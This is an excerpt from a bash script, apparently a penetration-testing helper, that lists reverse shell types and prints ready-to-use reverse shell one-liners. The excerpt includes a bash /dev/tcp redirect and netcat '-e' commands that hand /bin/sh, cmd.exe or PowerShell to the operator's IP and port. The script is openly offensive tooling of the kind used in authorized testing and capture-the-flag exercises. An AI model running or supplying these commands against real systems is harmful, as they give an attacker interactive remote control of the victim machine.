...
if [[ "$1" =~ ^rev(shell)?$ ]] && { [ "$#" -eq 1 ] || { [ "$#" -eq 2 ] && [ "$2" == "help" ]; }; }; then
  ...
  echo -e "\nAvailable revshells:"
  SHELLS="bash sh php pyton2|py2 python|python3|py|py3 perl ruby nc|ncat|netcat awk go ps|psh|pwsh|powershell lua telnet socat"
  IFS=" "
  for i in $SHELLS; do
    echo "[+] $i"
  done | sort
...
if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -ge 2 ]; then
  ...
  TYPE="$2"
  case "$TYPE" in
    "bash"|"sh")                    echo "$TYPE -i >& /dev/tcp/$(getIP)/$PORT 0>&1" ;;
    ...
    "nc"|"ncat"|"netcat")           echo -e "$TYPE -e /bin/sh $(getIP) $PORT\n$TYPE -e cmd.exe $(getIP) $PORT\n$TYPE -e powershell.exe $(getIP) $PORT" ;;
